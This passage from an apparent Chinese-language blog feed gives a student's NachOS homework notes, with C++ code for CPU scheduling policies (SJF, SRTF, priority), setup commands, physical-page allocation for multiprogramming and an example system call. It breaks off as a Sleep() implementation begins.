list</span><br><br>    <span class="hljs-comment">// 加上</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setSchedulerType</span><span class="hljs-params">(SchedulerType t)</span> </span>&#123;schedulerType = t;&#125;<br><span class="hljs-function">SchedulerType <span class="hljs-title">getSchedulerType</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-keyword">return</span> schedulerType;&#125;<br></code></pre></td></tr></table></figure><p>最主要要動手腳的地方就在這裡 ! 根據不同的排程方法，造出不同的 ReadyList。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c++">/code/threads/scheduler.cc<br><br><span class="hljs-comment">// 加上 compare function (做 sortlist 的時候要用的)</span><br><span class="hljs-comment">//----------------------------------------------------------------------</span><br><span class="hljs-comment">// Compare function</span><br><span class="hljs-comment">//----------------------------------------------------------------------</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">PriorityCompare</span><span class="hljs-params">(Thread *a, Thread *b)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(a-&gt;<span class="hljs-built_in">getPriority</span>() == b-&gt;<span class="hljs-built_in">getPriority</span>())<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> a-&gt;<span class="hljs-built_in">getPriority</span>() &gt; b-&gt;<span class="hljs-built_in">getPriority</span>() ? <span class="hljs-number">1</span> : <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">FIFOCompare</span><span class="hljs-params">(Thread *a, Thread *b)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SJFCompare</span><span class="hljs-params">(Thread *a, Thread *b)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(a-&gt;<span class="hljs-built_in">getBurstTime</span>() == b-&gt;<span class="hljs-built_in">getBurstTime</span>())<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> a-&gt;<span class="hljs-built_in">getBurstTime</span>() &gt; b-&gt;<span class="hljs-built_in">getBurstTime</span>() ? <span class="hljs-number">1</span> : <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">//----------------------------------------------------------------------</span><br><span class="hljs-comment">// Scheduler::Scheduler</span><br><span class="hljs-comment">// Initialize the list of ready but not running threads.</span><br><span class="hljs-comment">//Initially, no ready threads.</span><br><span class="hljs-comment">//----------------------------------------------------------------------</span><br>Scheduler::<span class="hljs-built_in">Scheduler</span>()<br>&#123; <br><span class="hljs-built_in">Scheduler</span>(RR);<br>&#125;<br><br><span class="hljs-comment">// 主要要自己動手的地方都在這裡而已</span><br>Scheduler::<span class="hljs-built_in">Scheduler</span>(SchedulerType type)<br>&#123;<br>schedulerType = type;<br><span class="hljs-keyword">switch</span>(schedulerType) &#123;<br>        <span class="hljs-keyword">case</span> RR:<br>            readyList = <span class="hljs-keyword">new</span> List&lt;Thread *&gt;;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> SJF:<br>            readyList = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SortedList</span>&lt;Thread *&gt;(SJFCompare);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> Priority:<br>            readyList = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SortedList</span>&lt;Thread *&gt;(PriorityCompare);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> FIFO:<br>            readyList = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SortedList</span>&lt;Thread *&gt;(FIFOCompare);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> SRTF:<br>            <span class="hljs-comment">// 和SJF其實一樣，這兩個的差別本來就只有是不是preemptive而已</span><br>            readyList = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SortedList</span>&lt;Thread *&gt;(SJFCompare);<br>            <span class="hljs-keyword">break</span>;<br>   &#125;<br>toBeDestroyed = <span class="hljs-literal">NULL</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>SRTF 有 preemptive，所以比較麻煩需要對原本已經完成的 Sleep 部分多做調整，讓他可以直接被我們的排程使用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++">/code/threads/alarm.cc<br><br><span class="hljs-comment">// 對原本的PutToSleep多做調整</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SleepList::PutToSleep</span><span class="hljs-params">(Thread*t, <span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    IntStatus oldLevel = kernel-&gt;interrupt-&gt;<span class="hljs-built_in">SetLevel</span>(IntOff); <span class="hljs-comment">// 不讓其他 thread 可以中斷</span><br>    <span class="hljs-built_in">ASSERT</span>(kernel-&gt;interrupt-&gt;<span class="hljs-built_in">getLevel</span>() == IntOff);  <span class="hljs-comment">// check if it cannot be interrupt.</span><br>    threadlist.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">SleepThread</span>(t, counter + x));        <span class="hljs-comment">// put into the list</span><br>    <span class="hljs-keyword">if</span>(kernel-&gt;scheduler-&gt;<span class="hljs-built_in">getSchedulerType</span>() != SRTF)&#123;<br>    t-&gt;<span class="hljs-built_in">Sleep</span>(<span class="hljs-literal">false</span>);<br>    &#125;<br>    kernel-&gt;interrupt-&gt;<span class="hljs-built_in">SetLevel</span>(oldLevel);<br>&#125;<br><br><span class="hljs-comment">// PutToReady 的最前和最後也做了關掉中斷的動作</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SleepList::PutToReady</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    IntStatus oldLevel = kernel-&gt;interrupt-&gt;<span class="hljs-built_in">SetLevel</span>(IntOff);<br>    ...<br>    ...<br>    kernel-&gt;interrupt-&gt;<span class="hljs-built_in">SetLevel</span>(oldLevel);<br>    <span class="hljs-keyword">return</span> woken;<br>&#125;<br></code></pre></td></tr></table></figure><p>Fork 裡面把 SRTF 的 ReadyToRun 關掉<br>Yield 裡面也要加上判斷下一個 thread 是誰、會不會被中斷換掉</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c++">/code/threads/thread.<span class="hljs-function">cc</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-type">void</span> </span><br><span class="hljs-function"><span class="hljs-title">Thread::Fork</span><span class="hljs-params">(VoidFunctionPtr func, <span class="hljs-type">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    Interrupt *interrupt = kernel-&gt;interrupt;<br>    Scheduler *scheduler = kernel-&gt;scheduler;<br>    IntStatus oldLevel;<br>    <br>    <span class="hljs-built_in">DEBUG</span>(dbgThread, <span class="hljs-string">&quot;Forking thread: &quot;</span> &lt;&lt; name &lt;&lt; <span class="hljs-string">&quot; f(a): &quot;</span> &lt;&lt; (<span class="hljs-type">int</span>) func &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; arg);<br>    <br>    <span class="hljs-built_in">StackAllocate</span>(func, arg);<br><br>    oldLevel = interrupt-&gt;<span class="hljs-built_in">SetLevel</span>(IntOff);<br><br>    <span class="hljs-keyword">if</span>(scheduler-&gt;<span class="hljs-built_in">getSchedulerType</span>() != SRTF)&#123; <span class="hljs-comment">//因為他不一定一 fork 就可以 run</span><br>        scheduler-&gt;<span class="hljs-built_in">ReadyToRun</span>(<span class="hljs-keyword">this</span>);<span class="hljs-comment">// ReadyToRun assumes that interrupts are disabled!</span><br>    &#125;<br>    (<span class="hljs-type">void</span>) interrupt-&gt;<span class="hljs-built_in">SetLevel</span>(oldLevel);<br>&#125; <br><br><br><span class="hljs-function"><span class="hljs-type">void</span></span><br><span class="hljs-function"><span class="hljs-title">Thread::Yield</span> <span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    Thread *nextThread;<br>    IntStatus oldLevel = kernel-&gt;interrupt-&gt;<span class="hljs-built_in">SetLevel</span>(IntOff);<br>    <br>    <span class="hljs-built_in">ASSERT</span>(<span class="hljs-keyword">this</span> == kernel-&gt;currentThread);<br>    <br>    <span class="hljs-built_in">DEBUG</span>(dbgThread, <span class="hljs-string">&quot;Yielding thread: &quot;</span> &lt;&lt; name);<br><br>    nextThread = kernel-&gt;scheduler-&gt;<span class="hljs-built_in">FindNextToRun</span>();<br>    <span class="hljs-comment">// 更改這一段//////////////////////////////////////////////////</span><br>    <span class="hljs-keyword">if</span> (nextThread != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-comment">// 因為是 preemtive 所以每次的 yield 都要判斷會不會被中斷</span><br>        <span class="hljs-comment">// 有可能不會被中斷，所以不能像其他排程法一樣直接把 nextThread 丟到 ReadyToRun</span><br>        <span class="hljs-keyword">if</span>(kernel-&gt;scheduler-&gt;<span class="hljs-built_in">getSchedulerType</span>() == SRTF)&#123;<br>            <span class="hljs-keyword">if</span>(nextThread-&gt;<span class="hljs-built_in">getBurstTime</span>() &lt; <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">getBurstTime</span>())&#123;<br>                kernel-&gt;scheduler-&gt;<span class="hljs-built_in">ReadyToRun</span>(<span class="hljs-keyword">this</span>);<br>                kernel-&gt;scheduler-&gt;<span class="hljs-built_in">Run</span>(nextThread, FALSE);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                kernel-&gt;scheduler-&gt;<span class="hljs-built_in">ReadyToRun</span>(nextThread);<br>            &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>            kernel-&gt;scheduler-&gt;<span class="hljs-built_in">ReadyToRun</span>(<span class="hljs-keyword">this</span>);<br>            kernel-&gt;scheduler-&gt;<span class="hljs-built_in">Run</span>(nextThread, FALSE);<br>    &#125;<br>    &#125;<br>    <span class="hljs-comment">////////////////////////////////////////////////////////////////</span><br>    (<span class="hljs-type">void</span>) kernel-&gt;interrupt-&gt;<span class="hljs-built_in">SetLevel</span>(oldLevel);<br>&#125;<br></code></pre></td></tr></table></figure><p>完成 !</p><h1 id="結果"><a href="#結果" class="headerlink" title="結果"></a>結果</h1><h2 id="用-SelfTest"><a href="#用-SelfTest" class="headerlink" title="用 SelfTest"></a>用 SelfTest</h2><ul><li>SJF<br><img src="https://i.imgur.com/Es9W7n5.jpg"></li><li>SRTF<br><img src="https://i.imgur.com/8itBJVC.jpg"></li></ul><h2 id="用-userprog"><a href="#用-userprog" class="headerlink" title="用 userprog"></a>用 userprog</h2><ul><li>FCFS<br><img src="https://i.imgur.com/yTg4P5r.jpg"><br><img src="https://i.imgur.com/H2QegMW.jpg"></li></ul>]]></content>
    
    
    <categories>
      
      <category>homework</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSIE--NachOS-HW1</title>
    <link href="/2019/10/10/2019-10-10-OS_HW1-2019/"/>
    <url>/2019/10/10/2019-10-10-OS_HW1-2019/</url>
    
    <content type="html"><![CDATA[<p>第一次碰 OS 相關的東西，超級不熟，怕之後會忘記所以紀錄一下<br>參考了很多學長的 blog 一邊試才寫出來的第一次作業 orz 要再花時間把架構搞清楚一點才行<br>主要參考這兩個 blog :</p><p><a href="http://blog.terrynini.tw/tw/OS-NachOS-HW1/">Terry Nini OS::NachOS::HW1</a></p><p><a href="https://morris821028.github.io/2014/05/24/lesson/hw-nachos4/">Morris Blog 向 NachOS 4.0 作業進發 (1)</a></p><h1 id="初始作業"><a href="#初始作業" class="headerlink" title="初始作業"></a>初始作業</h1><h2 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h2><p>說是要跑在 ubuntu 14.04 (32 bit) 或更舊的版本才行，不然就要另外去 patch，真的是比 14.04 新一點都會出問題，我一開始載到 14.04.1 就卡關到不行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt install git csh g++<br>$ git <span class="hljs-built_in">clone</span> https://github.com/connlabtw/NachOS.git<br>$ <span class="hljs-built_in">cd</span> NachOS<br>$ sudo <span class="hljs-built_in">cp</span> -r usr /<br>$ <span class="hljs-built_in">cd</span> code<br>$ make<br></code></pre></td></tr></table></figure><h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><p>然後就能來測試能不能正常運行了<br>進到 NachOS&#x2F;code&#x2F;userprog 裡面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./nachos –e ../test/test1<br></code></pre></td></tr></table></figure><p>如果正常就應該能看到這樣的結果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Total threads number is 1<br>Thread ../test/test1 is executing.<br>Print <span class="hljs-built_in">integer</span>:9<br>Print <span class="hljs-built_in">integer</span>:8<br>Print <span class="hljs-built_in">integer</span>:7<br>Print <span class="hljs-built_in">integer</span>:6<br><span class="hljs-built_in">return</span> value:0<br>No threads ready or runnable, and no pending interrupts.<br>Assuming the program completed.<br>Machine halting!<br><br>Ticks: total 200, idle 66, system 40, user 94<br>Disk I/O: reads 0, writes 0<br>Console I/O: reads 0, writes 0<br>Paging: faults 0<br>Network I/O: packets received 0, sent 0<br></code></pre></td></tr></table></figure><p>我照網路上也去試試同時跑兩個 process (要記得先去 Makefile 裡面加上 test2 再 make test2)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./nachos -e ../test/test1 -e ../test/test2<br></code></pre></td></tr></table></figure><h1 id="MultiProgramming"><a href="#MultiProgramming" class="headerlink" title="MultiProgramming"></a>MultiProgramming</h1><p>看了很多 blog 都有提到這問題，我一開始卻沒遇到，我才剛慶幸我沒有遇到這問題結果在測試我的 Sleep() 就遇到了，有夠…</p><p>反正當我想同時跑兩個不同時間的 Sleep() 並交互使用 PrintInt 時發現這兩個 thread 竟然互相干擾，我只想印十遍的內容竟然重複了近三十遍，每到記數變數 i 快要接近終結的 10 時，都會跳掉，很明顯就是兩個 thread 用到同一塊記憶體了，所以以下就是根據 Morris 的 blog 改的</p><p>code&#x2F;userprog&#x2F;addrspace.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AddrSpace</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    ...<br>    <span class="hljs-comment">//加上這一行</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">bool</span> usedPhyPage[NumPhysPages];<br>  <span class="hljs-keyword">private</span>:<br>    ...<br>&#125;;<br></code></pre></td></tr></table></figure><p>code&#x2F;usrprog&#x2F;addrspace.cc<br>加上這一行宣告+初始化</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">bool</span> AddrSpace::usedPhyPage[NumPhysPages] = &#123;<span class="hljs-number">0</span>&#125;;<br></code></pre></td></tr></table></figure><p>釋放資源</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++">AddrSpace::~<span class="hljs-built_in">AddrSpace</span>()<br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numPages; i++)<br>        AddrSpace::usedPhyPage[pageTable[i].physicalPage] = <span class="hljs-literal">false</span>;<br>   <span class="hljs-keyword">delete</span> pageTable;<br>&#125;<br></code></pre></td></tr></table></figure><p>也是在 code&#x2F;userprog&#x2F;addrspace.cc 改上這一部分<br>主要就是找到能用的 page、算出進入點。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">AddrSpace::Load</span><span class="hljs-params">(<span class="hljs-type">char</span> *fileName)</span> </span>&#123;<br>    OpenFile *executable = kernel-&gt;fileSystem-&gt;<span class="hljs-built_in">Open</span>(fileName);<br>    NoffHeader noffH;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<br>    <span class="hljs-keyword">if</span> (executable == <span class="hljs-literal">NULL</span>) &#123;<br>    cerr &lt;&lt; <span class="hljs-string">&quot;Unable to open file &quot;</span> &lt;&lt; fileName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    executable-&gt;<span class="hljs-built_in">ReadAt</span>((<span class="hljs-type">char</span> *)&amp;noffH, <span class="hljs-built_in">sizeof</span>(noffH), <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> ((noffH.noffMagic != NOFFMAGIC) &amp;&amp; <br>        (<span class="hljs-built_in">WordToHost</span>(noffH.noffMagic) == NOFFMAGIC))<br>     <span class="hljs-built_in">SwapHeader</span>(&amp;noffH);<br>    <span class="hljs-built_in">ASSERT</span>(noffH.noffMagic == NOFFMAGIC);<br><span class="hljs-comment">// how big is address space?</span><br>    size = noffH.code.size + noffH.initData.size + noffH.uninitData.size <br>            + UserStackSize; <span class="hljs-comment">// we need to increase the size</span><br>                        <span class="hljs-comment">// to leave room for the stack</span><br>    numPages = <span class="hljs-built_in">divRoundUp</span>(size, PageSize);<br><span class="hljs-comment">// cout &lt;&lt; &quot;number of pages of &quot; &lt;&lt; fileName&lt;&lt; &quot; is &quot;&lt;&lt; numPages &lt;&lt; endl;</span><br><span class="hljs-comment">/////////////////////////加上這一段////////////////////////////////////////</span><br>    pageTable = <span class="hljs-keyword">new</span> TranslationEntry[numPages];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; i &lt; numPages; i++) &#123;<br>        pageTable[i].virtualPage = i;<br>        <br>        <span class="hljs-comment">// 這裡是指一直往下找到沒有被用過的page為止</span><br>        <span class="hljs-keyword">while</span>(j &lt; NumPhysPages &amp;&amp; AddrSpace::usedPhyPage[j] == <span class="hljs-literal">true</span>)<br>            j++;<br>        <span class="hljs-comment">// 找到以後就用這個沒被用過的page了</span><br>        AddrSpace::usedPhyPage[j] = <span class="hljs-literal">true</span>;<br>        pageTable[i].physicalPage = j;<br>        pageTable[i].valid = <span class="hljs-literal">true</span>;<br>        pageTable[i].use = <span class="hljs-literal">false</span>;<br>        pageTable[i].dirty = <span class="hljs-literal">false</span>;<br>        pageTable[i].readOnly = <span class="hljs-literal">false</span>;<br>    &#125;<br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////</span><br>    size = numPages * PageSize;<br>    <span class="hljs-built_in">ASSERT</span>(numPages &lt;= NumPhysPages);  <span class="hljs-comment">// check we&#x27;re not trying</span><br>                        <span class="hljs-comment">// to run anything too big --</span><br>                        <span class="hljs-comment">// at least until we have</span><br>                        <span class="hljs-comment">// virtual memory</span><br>    <span class="hljs-built_in">DEBUG</span>(dbgAddr, <span class="hljs-string">&quot;Initializing address space: &quot;</span> &lt;&lt; numPages &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; size);<br><span class="hljs-comment">// then, copy in the code and data segments into memory</span><br>    <span class="hljs-keyword">if</span> (noffH.code.size &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">DEBUG</span>(dbgAddr, <span class="hljs-string">&quot;Initializing code segment.&quot;</span>);<br>    <span class="hljs-built_in">DEBUG</span>(dbgAddr, noffH.code.virtualAddr &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; noffH.code.size);<br><span class="hljs-comment">// 這裡更改mainmemory中的項次</span><br><span class="hljs-comment">// 主要做的就是先算出第幾頁，然後乘上 PageSize 就是 page base，而 page offset 則是 code.address % PageSize</span><br><span class="hljs-comment">// offset + base 就是進入點了</span><br>         executable-&gt;<span class="hljs-built_in">ReadAt</span>(<br>        &amp;(kernel-&gt;machine-&gt;mainMemory[pageTable[noffH.code.virtualAddr/PageSize].physicalPage * PageSize + (noffH.code.virtualAddr%PageSize)]), <br>            noffH.code.size, noffH.code.inFileAddr);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (noffH.initData.size &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">DEBUG</span>(dbgAddr, <span class="hljs-string">&quot;Initializing data segment.&quot;</span>);<br>    <span class="hljs-built_in">DEBUG</span>(dbgAddr, noffH.initData.virtualAddr &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; noffH.initData.size);<br><span class="hljs-comment">// 這裡更改mainmemory中的項次</span><br>        executable-&gt;<span class="hljs-built_in">ReadAt</span>(<br>        &amp;(kernel-&gt;machine-&gt;mainMemory[pageTable[noffH.initData.virtualAddr/PageSize].physicalPage * PageSize + (noffH.code.virtualAddr%PageSize)]),<br>            noffH.initData.size, noffH.initData.inFileAddr);<br>    &#125;<br>    <span class="hljs-keyword">delete</span> executable;   <span class="hljs-comment">// close file</span><br>    <span class="hljs-keyword">return</span> TRUE;   <span class="hljs-comment">// success</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="System-Call-example"><a href="#System-Call-example" class="headerlink" title="System Call example"></a>System Call example</h1><p>Slide 裡面有一個實作一個 system call 的 example，只要照著 slide 就能做出一個 system call，和 PrintInt 的功能一樣。<br>到 &#x2F;code&#x2F;userprog&#x2F;syscall.h 加上 define 和宣告</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SC_Example 12</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Example</span><span class="hljs-params">(<span class="hljs-type">int</span> number)</span></span>; <br>/code/userprog/ exception.cc<br><br><span class="hljs-keyword">case</span> SC_Example:<br>    val=kernel-&gt;machine-&gt;<span class="hljs-built_in">ReadRegister</span>(<span class="hljs-number">4</span>);<br>    cout &lt;&lt; <span class="hljs-string">&quot;Example value:&quot;</span> &lt;&lt; val &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span>;<br>/code/test/start.s 加上assembly<br><br>    .globl Example<br>    .ent Example<br>Example:<br>    addiu $<span class="hljs-number">2</span>,$<span class="hljs-number">0</span>,SC_Example<br>    syscall<br>    j $<span class="hljs-number">31</span><br>    .end Example<br></code></pre></td></tr></table></figure><p>到&#x2F;code&#x2F;test裡面加上一個example.c的檔案</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;syscall.h&quot;</span></span><br><span class="hljs-built_in">main</span>()<br>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-keyword">for</span> (n=<span class="hljs-number">1</span>;n&lt;<span class="hljs-number">5</span>;n++)<br>    <span class="hljs-built_in">Example</span>(n);<br>&#125;<br></code></pre></td></tr></table></figure><p>之後 recompile NachOS，然後和之前一樣到 test&#x2F;Makefile 裡面加上 example 然後 make example 之後就能跑起來了<br>順便 Makefile 裡面的格式長這樣</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">example: example.o start.o<br>    $(LD) $(LDFLAGS) start.o example.o -o example.coff<br>    ../bin/coff2noff example.coff example<br></code></pre></td></tr></table></figure><h1 id="Implement-Sleep"><a href="#Implement-Sleep" class="headerlink" title="Implement Sleep()"></a>Implement Sleep()</h1><p>一開始就先像製造出 Example 一樣的方法<br>到 &#x2F;code&#x2F;userprog&#x2F; syscall.h 加上 define 和宣告</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 